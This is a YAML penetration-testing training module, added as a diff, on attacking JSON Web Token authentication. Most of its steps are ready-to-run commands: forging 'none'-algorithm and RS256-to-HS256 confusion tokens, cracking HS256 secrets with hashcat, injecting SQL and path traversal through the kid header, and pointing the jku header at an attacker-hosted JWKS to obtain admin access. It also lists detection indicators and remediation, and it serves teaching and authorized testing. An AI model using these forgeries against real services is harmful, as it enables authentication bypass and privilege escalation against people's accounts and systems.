@@ -1,0 +1,188 @@
+# Category: Web Application Security - JWT Attacks
+name: "JWT (JSON Web Token) Attack Testing"
+id: "web-jwt-001"
+category: "web_application"
+subcategory: "authentication"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Test JSON Web Token implementations for common vulnerabilities including algorithm
+  confusion, none algorithm, weak secrets, and key injection attacks. JWT flaws can
+  lead to authentication bypass and privilege escalation.
+
+learning_objectives:
+  - Decode and analyze JWT structure and claims
+  - Exploit none algorithm and alg:HS256 confusion attacks
+  - Brute-force weak JWT signing secrets
+  - Test for JWT header injection (kid, jku, x5u)
+
+tools:
+  - burp_suite
+  - jwt_tool
+  - hashcat
+  - python3
+  - curl
+
+prerequisites:
+  - Understanding of JWT structure (header.payload.signature)
+  - Base64 and JSON familiarity
+  - Web application testing fundamentals
+  - Written authorization from target owner
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Capture and decode JWT tokens"
+    commands:
+      - "# Capture JWT from login response"
+      - "curl -s -X POST 'http://[target_url]/login' -H 'Content-Type: application/json' -d '{\"username\":\"[username]\",\"password\":\"[password]\"}' | python3 -m json.tool"
+      - "# Decode JWT (base64)"
+      - "echo '[jwt_token]' | python3 -c \"import sys,base64,json; t=sys.stdin.read().strip().split('.'); [print(json.dumps(json.loads(base64.b64decode(p+'==').decode()),indent=2)) for p in t[:2]]\""
+      - "# Using jwt_tool"
+      - "python3 jwt_tool.py [jwt_token]"
+      - "# Identify algorithm, claims, expiry"
+      - "python3 jwt_tool.py [jwt_token] -T"
+    expected_output: "Decoded JWT header (alg, typ) and payload (sub, role, exp, iat)"
+    detection: "Normal authenticated request — no specific detection"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Algorithm confusion — none algorithm bypass"
+    commands:
+      - "# Manually craft none-algorithm JWT"
+      - "python3 -c \"\nimport base64, json\nheader = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')\npayload = base64.b64encode(json.dumps({'sub':'admin','role':'admin','exp':9999999999}).encode()).decode().rstrip('=')\nprint(f'{header}.{payload}.')\n\""
+      - "# Using jwt_tool"
+      - "python3 jwt_tool.py [jwt_token] -X a"
+      - "# Test none with capital NONE, None variations"
+      - "python3 jwt_tool.py [jwt_token] -X a -T"
+      - "# Use forged token in request"
+      - "curl -s -H 'Authorization: Bearer [forged_none_token]' 'http://[target_url]/api/admin'"
+    expected_output: "Admin access granted with forged none-algorithm token"
+    detection: "JWT with alg:none in authorization header; missing signature in token"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Algorithm confusion — RS256 to HS256 (public key confusion)"
+    commands:
+      - "# Step 1: Obtain server's public key"
+      - "curl -s 'http://[target_url]/.well-known/jwks.json'"
+      - "curl -s 'http://[target_url]/api/auth/public-key'"
+      - "# Step 2: Extract PEM from JWK"
+      - "python3 -c \"\nimport json, base64\nwith open('jwks.json') as f: jwks=json.load(f)\nprint(jwks['keys'][0])\n\""
+      - "# Step 3: Forge HS256 token signed with public key as HMAC secret"
+      - "python3 jwt_tool.py [jwt_token] -X k -pk server_public.pem"
+      - "# Step 4: Use forged token"
+      - "curl -s -H 'Authorization: Bearer [forged_hs256_token]' 'http://[target_url]/api/admin'"
+    expected_output: "Authentication bypass via algorithm confusion using public key as HMAC secret"
+    detection: "JWT with alg:HS256 when server expected RS256; unexpected admin claims"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Brute-force weak JWT secret (HS256)"
+    commands:
+      - "# Using jwt_tool"
+      - "python3 jwt_tool.py [jwt_token] -C -d /usr/share/wordlists/rockyou.txt"
+      - "# Using hashcat (mode 16500)"
+      - "echo '[jwt_token]' > /tmp/jwt.hash"
+      - "hashcat -m 16500 /tmp/jwt.hash /usr/share/wordlists/rockyou.txt"
+      - "hashcat -m 16500 /tmp/jwt.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
+      - "# After cracking — forge new token with admin role"
+      - "python3 -c \"\nimport hmac, hashlib, base64, json\nsecret = '[cracked_secret]'\nheader = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).decode().rstrip('=')\npayload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'administrator','exp':9999999999}).encode()).decode().rstrip('=')\nsig_input = f'{header}.{payload}'\nsig = base64.urlsafe_b64encode(hmac.new(secret.encode(),sig_input.encode(),hashlib.sha256).digest()).decode().rstrip('=')\nprint(f'{sig_input}.{sig}')\n\""
+    expected_output: "Cracked JWT secret and forged admin token"
+    detection: "Hashcat GPU activity on attacker host; multiple JWT tokens in offline file"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "JWT header injection — kid (key ID) manipulation"
+    commands:
+      - "# SQL injection via kid header"
+      - "python3 jwt_tool.py [jwt_token] -I -hc kid -hv \"0 UNION SELECT 'attackerkey' -- -\" -S hs256 -p 'attackerkey'"
+      - "# Path traversal via kid (file-based key)"
+      - "python3 jwt_tool.py [jwt_token] -I -hc kid -hv '../../../../dev/null' -S hs256 -p ''"
+      - "# Using jwt_tool X5U injection"
+      - "python3 jwt_tool.py [jwt_token] -X i"
+    expected_output: "Forged JWT accepted by server due to manipulated key ID resolution"
+    detection: "Unusual kid values in JWT header; SQL patterns in JWT kid field"
+
+  - id: "step6"
+    phase: "exploitation"
+    action: "JWT jku/x5u header injection — remote key serving"
+    commands:
+      - "# Generate RSA key pair"
+      - "openssl genrsa -out /tmp/private.pem 2048"
+      - "openssl rsa -in /tmp/private.pem -pubout -out /tmp/public.pem"
+      - "# Create JWKS endpoint on attacker server"
+      - "python3 jwt_tool.py [jwt_token] -X s"
+      - "# Inject jku pointing to attacker-controlled JWKS"
+      - "python3 jwt_tool.py [jwt_token] -I -hc jku -hv 'http://[attacker_ip]/jwks.json' -S rs256 -pr /tmp/private.pem"
+      - "# Serve JWKS"
+      - "python3 -m http.server 80 --directory /tmp"
+      - "# Test forged token"
+      - "curl -s -H 'Authorization: Bearer [forged_jku_token]' 'http://[target_url]/api/admin'"
+    expected_output: "Server fetches attacker-controlled JWKS and validates forged JWT"
+    detection: "JWT jku header pointing to external domain; server fetching external JWKS URL"
+
+compliance_controls:
+  - standard: "OWASP Top 10 2021"
+    control: "A07:2021"
+    description: "Identification and Authentication Failures"
+  - standard: "OWASP ASVS v4.0"
+    control: "3.5.2"
+    description: "JWT tokens validated using established cryptographic algorithms"
+  - standard: "NIST 800-53 Rev5"
+    control: "IA-8"
+    description: "Identification and authentication — non-organizational users"
+  - standard: "PCI DSS v4.0"
+    control: "8.3.2"
+    description: "Strong cryptography for authentication credentials"
+
+detection:
+  network_indicators:
+    - "JWT tokens with alg:none in authorization headers"
+    - "Server making outbound HTTP requests to fetch JWKS (jku header injection)"
+    - "JWT header containing SQL syntax in kid field"
+  log_indicators:
+    - "Authentication bypass events for admin endpoints"
+    - "JWT validation errors followed by successful auth (algorithm downgrade)"
+    - "Outbound requests from application to attacker JWKS URL"
+  endpoint_indicators:
+    - "Multiple JWT tokens with different algorithm headers in logs"
+    - "JWT claims with unexpected role elevation"
+
+remediation:
+  immediate:
+    - "Explicitly whitelist allowed JWT algorithms — never accept 'none'"
+    - "Use a strong, randomly generated secret (256-bit minimum) for HS256"
+    - "Validate kid header strictly — never use it in file paths or SQL queries"
+    - "Reject jwk, jku, x5u, and x5c headers to prevent key injection"
+  long_term:
+    - "Prefer RS256/ES256 asymmetric algorithms with proper key management"
+    - "Implement JWT expiry and short token lifetime (15 minutes for access tokens)"
+    - "Use a battle-tested JWT library — never implement JWT validation manually"
+    - "Regular security testing of authentication and token validation logic"
+
+variables:
+  target_url: "http://target.example.com"
+  username: "testuser"
+  password: "testpass123"
+  jwt_token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIifQ.signature"
+  cracked_secret: "secret123"
+  attacker_ip: "10.10.10.1"
+
+assessment_questions:
+  - "Why is the 'none' algorithm a vulnerability in JWT implementations?"
+  - "How does the RS256-to-HS256 algorithm confusion attack work?"
+  - "What hashcat mode is used for cracking HS256 JWT tokens?"
+  - "How does jku header injection enable JWT forgery?"
+  - "Why is a short JWT expiry important even if the token is properly signed?"
+
+references:
+  - url: "https://portswigger.net/web-security/jwt"
+    title: "PortSwigger JWT Attack Labs"
+  - url: "https://github.com/ticarpi/jwt_tool"
+    title: "JWT Tool"
+  - url: "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"
+    title: "Critical JWT Vulnerabilities - Auth0"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"
+    title: "OWASP JWT Cheat Sheet"
